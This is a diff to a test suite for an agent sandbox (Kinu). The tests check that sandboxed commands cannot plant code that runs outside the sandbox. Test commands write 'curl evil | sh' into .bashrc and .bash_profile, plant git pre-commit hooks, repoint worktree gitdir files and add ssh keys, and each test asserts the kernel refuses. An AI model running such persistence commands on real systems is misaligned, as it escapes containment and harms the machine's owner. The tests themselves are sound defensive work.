@@ -23,7 +23,9 @@ const os = require('node:os');
 
 const path = require('node:path');
 
-const { runToExit } = require('@kinu.run/test-utils');
+const { gitEnv, runToExit } = require('@kinu.run/test-utils');
+
+const { spawnSync } = require('node:child_process');
 
 const sandbox = require('../src/sandbox.js');
 
@@ -40,7 +42,7 @@ async function runSandboxed(command, options = {}) {
     fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
   }
 
-  const plan = sandbox.plan({
+  const plan = await sandbox.plan({
     tier: options.tier ?? 'sandboxed',
     home: options.home ?? os.homedir(),
     agentHome,
@@ -155,7 +157,7 @@ describe('the device sandbox, as the kernel enforces it', () => {
 
     for (const dir of [agentHome, agentTmp, consented]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
 
-    const plan = sandbox.plan({
+    const plan = await sandbox.plan({
       tier: 'sandboxed', home: os.homedir(), agentHome, agentTmp,
       deviceHome: path.join(os.homedir(), '.kinu'), roots: [consented],
       cwd: consented, command: 'printf agent-wrote-this > report.txt; pwd', source: {},
@@ -289,7 +291,7 @@ describe('the device sandbox, as the kernel enforces it', () => {
     fs.writeFileSync(path.join(neighbour, 'notes.txt'), 'another-workspace-private');
     fs.writeFileSync(path.join(home, 'shared.txt'), 'shared-with-the-agent\n');
 
-    const plan = sandbox.plan({
+    const plan = await sandbox.plan({
       tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots: [home], cwd: agentHome, source: {},
       command: [
         'printf agent > "$HOME/x"',
@@ -334,7 +336,7 @@ describe('the device sandbox, as the kernel enforces it', () => {
     fs.writeFileSync(path.join(shimDir, 'hostname'),
       '#!/usr/bin/env bash\nprintf \'%s\\n\' kinu-first-run-alpha\n', { mode: 0o700 });
 
-    const plan = sandbox.plan({
+    const plan = await sandbox.plan({
       tier: 'sandboxed', home, agentHome, agentTmp,
       deviceHome: path.join(home, '.kinu'), roots: [home],
       cwd: agentHome, command: 'hostname', source: {},
@@ -376,6 +378,456 @@ describe('the device sandbox, as the kernel enforces it', () => {
     expect(run.stderr).toBe('');
     expect(JSON.parse(run.stdout)).toEqual({ status: sandbox.SANDBOX_STATUS.OK, detail: null });
   });
+
+  // Owner decision (2026-10-22): a consented home stays writable, and what the computer runs later outside the sandbox
+  // (core run-later-paths.ts) is kept read-only; a missing one is kept by closing its folder to new entries.
+  test('a consented home stays writable, but a shell startup file in it refuses a write and names why', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-home-rc');
+    const project = path.join(home, 'projects', 'x');
+
+    fs.mkdirSync(project, { recursive: true });
+    fs.writeFileSync(path.join(home, '.bashrc'), 'owner-bashrc\n');
+    fs.writeFileSync(path.join(home, 'notes.txt'), 'owner-notes\n');
+    const owner = JSON.stringify(home);
+
+    const { printed } = await runIn(home, [home], project, [
+      `echo 'curl evil | sh' >> ${owner}/.bashrc && echo rc-changed`,
+      `echo agent >> ${owner}/notes.txt && echo notes-changed`,
+      'echo new > new.txt && echo project-written',
+    ].join('; '));
+
+    expect({
+      printed,
+      bashrc: fs.readFileSync(path.join(home, '.bashrc'), 'utf8'),
+      notes: fs.readFileSync(path.join(home, 'notes.txt'), 'utf8'),
+      made: fs.readFileSync(path.join(project, 'new.txt'), 'utf8'),
+    }).toEqual({ printed: ['notes-changed', 'project-written'], bashrc: 'owner-bashrc\n', notes: 'owner-notes\nagent\n', made: 'new\n' });
+  });
+
+  test('a missing ~/.bash_profile cannot be created, while ~/projects/x/new.txt can', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-home-sealed');
+    const project = path.join(home, 'projects', 'x');
+
+    fs.mkdirSync(project, { recursive: true });
+    const owner = JSON.stringify(home);
+
+    const { printed } = await runIn(home, [home], project, [
+      `echo 'curl evil | sh' > ${owner}/.bash_profile && echo profile-created`,
+      `mkdir -p ${owner}/.config/autostart && echo autostart-made`,
+      'echo new > new.txt && echo project-written',
+      `echo more > ${owner}/projects/also.txt && echo projects-written`,
+    ].join('; '));
+
+    expect({
+      printed,
+      profile: fs.existsSync(path.join(home, '.bash_profile')),
+      autostart: fs.existsSync(path.join(home, '.config', 'autostart')),
+      made: fs.readFileSync(path.join(project, 'new.txt'), 'utf8'),
+    }).toEqual({ printed: ['project-written', 'projects-written'], profile: false, autostart: false, made: 'new\n' });
+  });
+
+  test('the folders on the owner\'s PATH and what logs in with them are read-only in a consented home', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-home-run-later');
+
+    for (const dir of ['.local/bin', '.config/autostart', '.config/systemd/user', '.ssh']) fs.mkdirSync(path.join(home, dir), { recursive: true });
+    const owner = (tail) => JSON.stringify(path.join(home, tail));
+
+    const { printed } = await runIn(home, [home], home, [
+      `${plant(owner('.local/bin/git'))}`,
+      `echo '[Desktop Entry]' > ${owner('.config/autostart/evil.desktop')} && echo autostart-written`,
+      `echo '[Service]' > ${owner('.config/systemd/user/evil.service')} && echo unit-written`,
+      `echo 'ssh-ed25519 AAAA agent' >> ${owner('.ssh/authorized_keys')} && echo key-added`,
+      `echo ok > ${owner('.config/other.conf')} && echo config-written`,
+    ].join('; '));
+
+    expect(printed).toEqual([]);
+
+    for (const tail of ['.local/bin/git', '.config/autostart/evil.desktop', '.config/systemd/user/evil.service', '.ssh/authorized_keys', '.config/other.conf']) {
+      expect(fs.existsSync(path.join(home, tail))).toBe(false);
+    }
+  });
+
+  test('a refused write to a startup file says which file and why, beside the kernel\'s words', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-home-note');
+
+    fs.writeFileSync(path.join(home, '.zshrc'), 'owner-zshrc\n');
+    const { plan } = await runIn(home, [home], home, 'true');
+    const kernel = `bash: line 1: ${path.join(home, '.zshrc')}: Read-only file system`;
+    const sealed = `bash: line 1: ${path.join(home, '.bash_profile')}: Read-only file system`;
+
+    expect(sandbox.guardNote(kernel, plan.guardNames)).toBe(`Kinu's sandbox refused that. ${path.join(home, '.zshrc')} is a shell startup file, which your shell runs outside the sandbox when it starts.`);
+    expect(sandbox.guardNote(sealed, plan.guardNames)).toContain(`Create it inside an existing folder instead, e.g. ${path.join(home, 'projects')}/…`);
+    expect(sandbox.guardNote('ls: cannot open directory: Permission denied', plan.guardNames)).toBe('');
+  });
+
+  test('a consented repository\'s hooks and config refuse a write, and a commit there still lands', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-repository');
+    const deviceHome = path.join(home, '.kinu');
+    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
+    const agentTmp = path.join(deviceHome, 'agents', 'ws', 'tmp');
+    const project = path.join(home, 'shop');
+
+    for (const dir of [agentHome, agentTmp, project]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
+    expect((await runToExit(['git', 'init', '-q', project], { env: gitEnv() })).exitCode).toBe(0);
+    const config = fs.readFileSync(path.join(project, '.git', 'config'), 'utf8');
+
+    const plan = await sandbox.plan({
+      tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots: [project], cwd: project, source: {},
+      command: [
+        'printf "#!/bin/sh\\necho planted\\n" > .git/hooks/pre-commit && echo hook-planted',
+        'git config core.hooksPath /tmp && echo hooks-path-set',
+        'echo shop > README.md && git add README.md',
+        'git -c user.name=agent -c user.email=agent@example.com commit -q -m first && echo committed',
+      ].join('; '),
+    });
+
+    const run = spawnSync(plan.argv[0], plan.argv.slice(1), { env: plan.env, encoding: 'utf8' });
+
+    expect(run.stdout.trim().split('\n')).toEqual(['committed']);
+    expect(fs.existsSync(path.join(project, '.git', 'hooks', 'pre-commit'))).toBe(false);
+    expect(fs.readFileSync(path.join(project, '.git', 'config'), 'utf8')).toBe(config);
+    expect((await runToExit(['git', '-C', project, 'log', '--format=%s'], { env: gitEnv() })).stdout.trim()).toBe('first');
+  });
+
+  /** A sandboxed command over `roots` on a machine whose home is `home`, run as the supervisor runs it. */
+  async function runIn(home, roots, cwd, command) {
+    const deviceHome = path.join(home, '.kinu');
+    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
+    const agentTmp = path.join(deviceHome, 'agents', 'ws', 'tmp');
+
+    for (const dir of [agentHome, agentTmp]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
+    const plan = await sandbox.plan({ tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots, cwd, source: {}, command });
+    const run = spawnSync(plan.argv[0], plan.argv.slice(1), { env: plan.env, encoding: 'utf8' });
+
+    return { plan, printed: String(run.stdout ?? '').trim().split('\n').filter((line) => line !== '') };
+  }
+
+  const plant = (file) => `mkdir -p "$(dirname ${file})" && printf "#!/bin/sh\\necho planted\\n" > ${file} && chmod +x ${file} && echo planted ${file}`;
+
+  const initialized = async (repo) => expect((await runToExit(['git', 'init', '-q', repo], { env: gitEnv() })).exitCode).toBe(0);
+
+  test('the hooks directory git would run is read-only, as the repository\'s config or the owner\'s names it, however deep', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-hooks-path');
+    const work = path.join(home, 'work');
+    const husky = path.join(work, 'web');
+    const deep = path.join(work, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'lib');
+
+    for (const repo of [husky, deep]) await initialized(repo);
+    expect((await runToExit(['git', '-C', husky, 'config', 'core.hooksPath', '.husky'], { env: gitEnv() })).exitCode).toBe(0);
+    // The owner's own git config names the hooks directory of every repository that names none.
+    fs.writeFileSync(path.join(home, '.gitconfig'), '[core]\n\thooksPath = .githooks\n');
+
+    const hooks = ['web/.husky/pre-commit', 'a/b/c/d/e/f/g/h/lib/.githooks/pre-commit', 'a/b/c/d/e/f/g/h/lib/.git/hooks/pre-commit'];
+    const { printed } = await runIn(home, [work], work, [...hooks.map(plant), 'echo notes > web/notes.txt && echo notes-written'].join('; '));
+
+    expect(printed).toEqual(['notes-written']);
+
+    for (const hook of hooks) expect(fs.existsSync(path.join(work, hook))).toBe(false);
+  });
+
+  test('a linked worktree\'s hooks directory is read-only, though its .git is a file', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    // This checkout's own layout: the main repository in the read-only home, a worktree in a shared folder.
+    const home = scratchDir('sandbox-worktree');
+    const main = path.join(home, 'Proteus');
+    const shared = path.join(home, 'wt');
+    const tree = path.join(shared, 'lane');
+    await initialized(main);
+
+    for (const args of [['config', 'core.hooksPath', '.githooks'], ['commit', '-q', '--allow-empty', '-m', 'first'], ['worktree', 'add', '-q', tree]]) {
+      expect((await runToExit(['git', '-C', main, '-c', 'user.name=o', '-c', 'user.email=o@example.com', ...args], { env: gitEnv() })).exitCode).toBe(0);
+    }
+
+    const { printed } = await runIn(home, [shared], tree, `${plant('.githooks/pre-commit')}; echo notes > notes.txt && echo notes-written`);
+
+    expect(printed).toEqual(['notes-written']);
+    expect(fs.existsSync(path.join(tree, '.githooks', 'pre-commit'))).toBe(false);
+  });
+
+  test('a shared folder inside a repository keeps the hooks directory the repository around it names there', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    // husky's monorepo setup: the repository's hooks live in the one package the owner shared.
+    const home = scratchDir('sandbox-monorepo');
+    const mono = path.join(home, 'mono');
+    const frontend = path.join(mono, 'frontend');
+    await initialized(mono);
+    fs.mkdirSync(frontend);
+    expect((await runToExit(['git', '-C', mono, 'config', 'core.hooksPath', 'frontend/.husky'], { env: gitEnv() })).exitCode).toBe(0);
+
+    const { printed } = await runIn(home, [frontend], frontend, `${plant('.husky/pre-commit')}; echo code > app.js && echo app-written`);
+
+    // The owner's own next commit, outside the sandbox, runs no hook.
+    const commit = await runToExit(['git', '-C', mono, '-c', 'user.name=o', '-c', 'user.email=o@example.com', 'commit', '-q', '--allow-empty', '-m', 'owner'], { env: gitEnv() });
+    expect({ exitCode: commit.exitCode, output: `${commit.stdout}${commit.stderr}` }).toEqual({ exitCode: 0, output: '' });
+    expect(printed).toEqual(['app-written']);
+  });
+
+  /** The owner's own git command, outside the sandbox, with the machine's home as its HOME: what it printed. */
+  const owner = async (home, cwd, args) => {
+    const ran = await runToExit(['git', '-c', 'user.name=o', '-c', 'user.email=o@example.com', '-c', 'protocol.file.allow=always', ...args], {
+      cwd, env: { HOME: home, PATH: process.env.PATH ?? '' },
+    });
+
+    return { exitCode: ran.exitCode, planted: `${ran.stdout}${ran.stderr}`.includes('planted') };
+  };
+
+  test('a repository\'s git directory cannot be moved aside and replaced by a writable copy', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-git-rename');
+    const shared = path.join(home, 'shared');
+    const [shop, cafe] = [path.join(shared, 'shop'), path.join(shared, 'nested', 'cafe')];
+
+    for (const repo of [shop, cafe]) await initialized(repo);
+
+    // The git directory itself, and a folder above it: either moved, the read-only binds move with it.
+    const { printed } = await runIn(home, [shared], shared, [
+      `(cd shop && mv .git .git.orig && cp -a .git.orig .git && ${plant('.git/hooks/pre-commit')})`,
+      `(mv nested nested.orig && cp -a nested.orig nested && ${plant('nested/cafe/.git/hooks/pre-commit')})`,
+    ].join('; '));
+
+    for (const repo of [shop, cafe]) {
+      expect(await owner(home, repo, ['commit', '-q', '--allow-empty', '-m', 'owner'])).toEqual({ exitCode: 0, planted: false });
+    }
+
+    expect(printed).toEqual([]);
+  });
+
+  test('a linked worktree\'s .git file cannot be pointed at a repository the agent made', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-gitdir-file');
+    const [main, shared] = [path.join(home, 'Proteus'), path.join(home, 'wt')];
+    const tree = path.join(shared, 'lane');
+    await initialized(main);
+    expect((await owner(home, main, ['commit', '-q', '--allow-empty', '-m', 'first'])).exitCode).toBe(0);
+    expect((await owner(home, main, ['worktree', 'add', '-q', tree])).exitCode).toBe(0);
+
+    await runIn(home, [shared], shared, [
+      `git init -q evil && ${plant('evil/.git/hooks/pre-commit')}`,
+      'printf "gitdir: %s\\n" "$PWD/evil/.git" > lane/.git && echo pointed',
+    ].join(' && '));
+
+    expect((await owner(home, tree, ['commit', '-q', '--allow-empty', '-m', 'owner'])).planted).toBe(false);
+  });
+
+  test('a shared repository\'s record of a worktree elsewhere cannot be pointed at a repository the agent made', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-commondir');
+    const shared = path.join(home, 'shared');
+    const [mono, tree] = [path.join(shared, 'mono'), path.join(home, 'wt', 'lane')];
+    await initialized(mono);
+    expect((await owner(home, mono, ['commit', '-q', '--allow-empty', '-m', 'first'])).exitCode).toBe(0);
+    expect((await owner(home, mono, ['worktree', 'add', '-q', tree])).exitCode).toBe(0);
+
+    await runIn(home, [shared], shared, [
+      `git init -q evil && ${plant('evil/.git/hooks/pre-commit')}`,
+      'printf "%s\\n" "$PWD/evil/.git" > mono/.git/worktrees/lane/commondir',
+      'printf "%s\\n" "$PWD/evil/.git" > mono/.git/worktrees/lane/gitdir',
+    ].join('; '));
+
+    expect((await owner(home, tree, ['commit', '-q', '--allow-empty', '-m', 'owner'])).planted).toBe(false);
+  });
+
+  test('a submodule\'s superproject is asked, and the hooks directory it names in the submodule is read-only', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-submodule');
+    const [mono, source] = [path.join(home, 'mono'), path.join(home, 'ui-source')];
+
+    for (const repo of [mono, source]) {
+      await initialized(repo);
+      expect((await owner(home, repo, ['commit', '-q', '--allow-empty', '-m', 'first'])).exitCode).toBe(0);
+    }
+
+    expect((await owner(home, mono, ['submodule', 'add', '-q', source, 'libs/ui'])).exitCode).toBe(0);
+    expect((await owner(home, mono, ['config', 'core.hooksPath', 'libs/ui/.husky'])).exitCode).toBe(0);
+    const ui = path.join(mono, 'libs', 'ui');
+
+    const { printed } = await runIn(home, [ui], ui, plant('.husky/pre-commit'));
+
+    expect(await owner(home, mono, ['commit', '-q', '-m', 'owner'])).toEqual({ exitCode: 0, planted: false });
+    expect(printed).toEqual([]);
+  });
+
+  test('a bare repository holding the shared folder keeps its hooks, which the owner\'s push runs', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-bare');
+    const [bare, clone] = [path.join(home, 'srv', 'project.git'), path.join(home, 'clone')];
+    fs.mkdirSync(bare, { recursive: true });
+    expect((await runToExit(['git', 'init', '-q', '--bare', bare], { env: gitEnv() })).exitCode).toBe(0);
+
+    const { printed } = await runIn(home, [bare], bare, plant('hooks/post-receive'));
+
+    expect((await owner(home, home, ['clone', '-q', bare, clone])).exitCode).toBe(0);
+    expect((await owner(home, clone, ['commit', '-q', '--allow-empty', '-m', 'owner'])).exitCode).toBe(0);
+    expect(await owner(home, clone, ['push', '-q', 'origin', 'HEAD'])).toEqual({ exitCode: 0, planted: false });
+    expect(printed).toEqual([]);
+  });
+
+  test('a hooks directory the owner\'s global config names is read-only, with no repository in the shared folder', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-global-hooks');
+    const [shared, other] = [path.join(home, 'shared'), path.join(home, 'other')];
+    fs.mkdirSync(shared);
+    fs.writeFileSync(path.join(home, '.gitconfig'), `[core]\n\thooksPath = ${path.join(shared, 'hooks')}\n`);
+    await initialized(other);
+
+    const { printed } = await runIn(home, [shared], shared, plant('hooks/pre-commit'));
+
+    expect(await owner(home, other, ['commit', '-q', '--allow-empty', '-m', 'owner'])).toEqual({ exitCode: 0, planted: false });
+    expect(printed).toEqual([]);
+  });
+
+  test('a clean filter\'s script in the shared folder is read-only, and the owner\'s git add runs the owner\'s', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-filter');
+    const app = path.join(home, 'work', 'app');
+    await initialized(app);
+    fs.mkdirSync(path.join(app, 'tools'));
+    fs.writeFileSync(path.join(app, 'tools', 'clean.sh'), '#!/bin/sh\ncat\n', { mode: 0o755 });
+    fs.writeFileSync(path.join(app, '.gitattributes'), '*.txt filter=tidy\n');
+    fs.writeFileSync(path.join(app, 'notes.txt'), 'notes\n');
+    expect((await owner(home, app, ['config', 'filter.tidy.clean', './tools/clean.sh'])).exitCode).toBe(0);
+
+    const { printed } = await runIn(home, [path.join(home, 'work')], app, 'printf "#!/bin/sh\\necho planted >&2\\ncat\\n" > tools/clean.sh && echo replaced');
+
+    expect(await owner(home, app, ['add', 'notes.txt'])).toEqual({ exitCode: 0, planted: false });
+    expect(printed).toEqual([]);
+  });
+
+  test('a pager the repository\'s config names in the shared folder is read-only, and git log pages through the owner\'s', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK || Bun.which('script') === null) return;
+    const home = scratchDir('sandbox-pager');
+    const app = path.join(home, 'work', 'app');
+    const pager = path.join(app, 'tools', 'pager.sh');
+    await initialized(app);
+    fs.mkdirSync(path.dirname(pager));
+    fs.writeFileSync(pager, '#!/bin/sh\ncat\n', { mode: 0o755 });
+    expect((await owner(home, app, ['commit', '-q', '--allow-empty', '-m', 'first'])).exitCode).toBe(0);
+    expect((await owner(home, app, ['config', 'core.pager', pager])).exitCode).toBe(0);
+
+    const { printed } = await runIn(home, [path.join(home, 'work')], app, 'printf "#!/bin/sh\\necho planted\\ncat\\n" > tools/pager.sh && echo replaced');
+    // A terminal, or git pages nothing.
+    const paged = await runToExit(['script', '-qec', 'git -p log -1', '/dev/null'], { cwd: app, env: { HOME: home, PATH: process.env.PATH ?? '', TERM: 'dumb' } });
+
+    expect({ exitCode: paged.exitCode, planted: paged.stdout.includes('planted') }).toEqual({ exitCode: 0, planted: false });
+    expect(printed).toEqual([]);
+  });
+
+  test('a hooksPath set on its section\'s header line is read as git reads it', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-header-line');
+    const repo = path.join(home, 'web');
+    await initialized(repo);
+    fs.appendFileSync(path.join(repo, '.git', 'config'), '[core] hooksPath = .husky\n');
+
+    const { printed } = await runIn(home, [repo], repo, plant('.husky/pre-commit'));
+
+    expect(printed).toEqual([]);
+    expect(fs.existsSync(path.join(repo, '.husky', 'pre-commit'))).toBe(false);
+  });
+
+  test('a hooksPath the machine\'s system config names is read-only too', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-system-config');
+    const repo = path.join(home, 'web');
+    await initialized(repo);
+    // Stands in for /etc/gitconfig: the git on this PATH reads its system config from here, as git reads it anywhere.
+    const system = path.join(home, 'system-gitconfig');
+    const shim = path.join(home, 'bin');
+    fs.writeFileSync(system, '[core]\n\thooksPath = .syshooks\n');
+    fs.mkdirSync(shim);
+    fs.writeFileSync(path.join(shim, 'git'), `#!/bin/sh\nGIT_CONFIG_SYSTEM=${system} exec ${Bun.which('git')} "$@"\n`, { mode: 0o755 });
+    const pathBefore = process.env.PATH;
+    process.env.PATH = `${shim}:${pathBefore}`;
+
+    try {
+      const { printed } = await runIn(home, [repo], repo, plant('.syshooks/pre-commit'));
+
+      expect(printed).toEqual([]);
+      expect(fs.existsSync(path.join(repo, '.syshooks', 'pre-commit'))).toBe(false);
+    } finally {
+      process.env.PATH = pathBefore;
+    }
+  });
+
+  test('a repository git refuses to read is named unguarded in the plan', async () => {
+    const home = scratchDir('sandbox-refused');
+    const work = path.join(home, 'work');
+    const broken = path.join(work, 'broken');
+    fs.mkdirSync(path.join(broken, '.git'), { recursive: true });
+    fs.writeFileSync(path.join(broken, '.git', 'HEAD'), 'not a ref\n');
+
+    const plan = await sandbox.plan({
+      tier: 'sandboxed', platform: 'darwin', home, agentHome: path.join(home, '.kinu', 'agents', 'ws', 'home'),
+      agentTmp: path.join(home, '.kinu', 'agents', 'ws', 'tmp'), deviceHome: path.join(home, '.kinu'), roots: [work], cwd: work, source: {}, command: 'true',
+    });
+
+    expect(plan.unguarded).toEqual([{ path: broken, why: expect.stringContaining('git refused to read it: ') }]);
+  });
+
+  test('a root past the walk\'s entry cap is named, so the model hears its repositories went unguarded', async () => {
+    const home = scratchDir('sandbox-capped');
+    const deviceHome = path.join(home, '.kinu');
+    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
+    const huge = path.join(home, 'huge');
+    const small = path.join(home, 'small');
+
+    for (const dir of [agentHome, huge, small]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
+
+    for (let at = 0; at <= sandbox.GUARD_ENTRIES; at += 1) fs.writeFileSync(path.join(huge, String(at)), '');
+
+    const plan = await sandbox.plan({
+      tier: 'sandboxed', platform: 'darwin', home, agentHome, agentTmp: path.join(deviceHome, 'agents', 'ws', 'tmp'), deviceHome,
+      roots: [huge, small], cwd: small, source: {}, command: 'true',
+    });
+
+    expect(plan.unguarded).toEqual([{ path: huge, why: `the sandbox stopped looking after ${String(sandbox.GUARD_ENTRIES)} entries` }]);
+  });
+
+  test('a startup file\'s hard link inside a writable root is refused, while the root\'s other files change', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-startup-link');
+    const deviceHome = path.join(home, '.kinu');
+    const agentHome = path.join(deviceHome, 'agents', 'ws', 'home');
+    const agentTmp = path.join(deviceHome, 'agents', 'ws', 'tmp');
+    const project = path.join(home, 'dotfiles');
+
+    for (const dir of [agentHome, agentTmp, project]) fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
+    fs.writeFileSync(path.join(home, '.bashrc'), 'owner-bashrc\n');
+    fs.linkSync(path.join(home, '.bashrc'), path.join(project, 'bashrc'));
+
+    const plan = await sandbox.plan({
+      tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots: [home, project], cwd: project, source: {},
+      command: 'echo x >> bashrc && echo link-changed; echo notes > notes.txt && echo notes-written',
+    });
+
+    const run = spawnSync(plan.argv[0], plan.argv.slice(1), { env: plan.env, encoding: 'utf8' });
+
+    expect(run.stdout.trim().split('\n')).toEqual(['notes-written']);
+    expect(fs.readFileSync(path.join(home, '.bashrc'), 'utf8')).toBe('owner-bashrc\n');
+  });
+
+
+  // P1 (2026-10-22, reproduced on next-rc 506d98b77): a sandboxed command planted a hook in a shared repository, and the
+  // owner's next commit, outside the sandbox, ran it.
+  test('a hook planted in a shared repository never runs on the owner\'s next commit', async () => {
+    if (!LINUX || (await sandbox.probe()).status !== sandbox.SANDBOX_STATUS.OK) return;
+    const home = scratchDir('sandbox-hook');
+    const repo = path.join(home, 'shop');
+    const git = async (...args) => runToExit(['git', '-C', repo, '-c', 'user.name=o', '-c', 'user.email=o@example.com', ...args], { env: { PATH: process.env.PATH ?? '', HOME: home } });
+
+    await initialized(repo);
+    const { printed } = await runIn(home, [repo], repo, `${plant('.git/hooks/pre-commit')}; echo code > app.js && echo app-written`);
+    const commit = await git('commit', '-q', '--allow-empty', '-m', 'owner');
+
+    expect({ printed, exitCode: commit.exitCode, output: `${commit.stdout}${commit.stderr}` }).toEqual({ printed: ['app-written'], exitCode: 0, output: '' });
+  });
+
 });
 
 /**
@@ -427,7 +879,7 @@ describe('a sandboxed command reads only the system and what the owner shared', 
     fs.writeFileSync(path.join(deviceHome, 'device.json'), '{"token":"pdt_machine_secret"}', { mode: 0o600 });
     fs.writeFileSync(path.join(home, 'shared.txt'), 'shared-with-the-agent');
 
-    const plan = sandbox.plan({
+    const plan = await sandbox.plan({
       tier: 'sandboxed', home, agentHome, agentTmp, deviceHome, roots: [home],
       cwd: home, command: `cat ${JSON.stringify(path.join(deviceHome, 'device.json'))} ${JSON.stringify(path.join(home, 'shared.txt'))} 2>&1`, source: {},
     });
@@ -560,6 +1012,47 @@ describe('one policy, two enforcers', () => {
     expect(() => view().resolvePath('/home/dev/.kinu/agents/ws-2/home/notes.md', 'read')).toThrow('inside Kinu\'s own directory');
   });
 
+  test('the file methods refuse what the shell is refused in a consented home and a repository, each naming why', async () => {
+    const home = scratchDir('view-home-guarded');
+    const project = path.join(home, 'work', 'shop');
+    fs.mkdirSync(project, { recursive: true });
+    expect((await runToExit(['git', 'init', '-q', project], { env: gitEnv() })).exitCode).toBe(0);
+    fs.writeFileSync(path.join(home, '.bashrc'), 'owner-bashrc');
+    fs.writeFileSync(path.join(home, 'notes.txt'), 'owner-notes');
+    fs.linkSync(path.join(home, '.bashrc'), path.join(project, 'bashrc'));
+
+    const policy = sandbox.viewFor({
+      platform: 'linux', home, agentHome: path.join(home, '.kinu/agents/ws-1/home'), deviceHome: path.join(home, '.kinu'), roots: [home],
+    });
+
+    // As a write method does it: the path judged on arrival, then the guard asked in its queue, right before it acts.
+    const refusal = async (target) => {
+      try {
+        await policy.refuseGuarded(policy.resolvePath(target, 'write'));
+
+        return null;
+      } catch (error) {
+        return error.message;
+      }
+    };
+
+    expect(await refusal(path.join(home, '.bashrc'))).toContain('a shell startup file');
+    expect(await refusal(path.join(project, 'bashrc'))).toContain('a shell startup file');
+    expect(await refusal(path.join(home, '.bash_profile'))).toContain(`Create it inside an existing folder instead, e.g. ${path.join(home, 'projects')}/…`);
+
+    for (const kept of ['.git/hooks/pre-commit', '.git/config']) {
+      expect(await refusal(path.join(project, kept))).toContain('runs outside the sandbox');
+    }
+
+    expect({ notes: await refusal(path.join(home, 'notes.txt')), readme: await refusal(path.join(project, 'README.md')), head: await refusal(path.join(project, '.git', 'HEAD')) })
+      .toEqual({ notes: null, readme: null, head: null });
+
+    expect(policy.resolvePath(path.join(home, '.bashrc'), 'read')).toBe(path.join(home, '.bashrc'));
+    expect(policy.resolvePath(path.join(home, 'notes.txt'), 'write')).toBe(path.join(home, 'notes.txt'));
+    expect(policy.resolvePath(path.join(project, 'README.md'), 'write')).toBe(path.join(project, 'README.md'));
+    expect(policy.resolvePath(path.join(project, '.git', 'HEAD'), 'write')).toBe(path.join(project, '.git', 'HEAD'));
+  });
+
   test('the system trees are readable and refuse a write, like the kernel', () => {
     const policy = view();
     expect(policy.resolvePath('/usr/lib/libc.so', 'read')).toBe('/usr/lib/libc.so');
@@ -687,8 +1180,8 @@ describe('the macOS profile, as generated text', () => {
     expect(text).toContain('(allow network*)');
   });
 
-  test('the plan spawns sandbox-exec with HOME pointed at the agent home', () => {
-    const plan = sandbox.plan({
+  test('the plan spawns sandbox-exec with HOME pointed at the agent home', async () => {
+    const plan = await sandbox.plan({
       tier: 'sandboxed', platform: 'darwin', home: '/Users/dev',
       agentHome: '/Users/dev/.kinu/agents/ws-1/home',
       agentTmp: '/Users/dev/.kinu/agents/ws-1/tmp',
